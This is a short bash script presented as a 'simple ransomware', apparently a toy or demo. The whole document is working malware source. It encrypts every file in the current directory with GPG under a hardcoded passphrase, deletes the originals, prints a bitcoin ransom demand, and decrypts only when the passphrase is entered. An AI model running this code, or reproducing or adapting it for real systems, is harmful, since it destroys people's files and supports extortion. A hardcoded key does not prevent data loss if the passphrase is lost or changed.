echo "Encrypting your files.... :)"

#Encrypting the files with GPG command, requiring a passphrase of hhs
#Then delete the original file
for file in *; do
 if [ -f "$file" ]; then
  gpg --batch --yes --passphrase "hhs" -c $file
  rm $file
 fi
done

#Display warning message, and loop until user enters the correct password.
#When entered, decrypt the gpg files and delete the ecrypted files
echo "+=============================================================+"
echo " WARNING - Your computer is infected by the simple ransomware"
echo "Please send many bitcoins to lolololol@lol.com to unlock files"
while true; do
 read -p "Enter password to unlock files: " input
 if [ "$input" = "hhs" ]; then
  echo "Decrypting files..."
  for file in *; do
   if [ -f "$file" ]; then
    gpg --batch --yes --passphrase "hhs" --use-embedded-filename -d $file
    rm $file
   fi
  done
  break
 else
  echo "Not right ;) send password to unlock files"
 fi
done
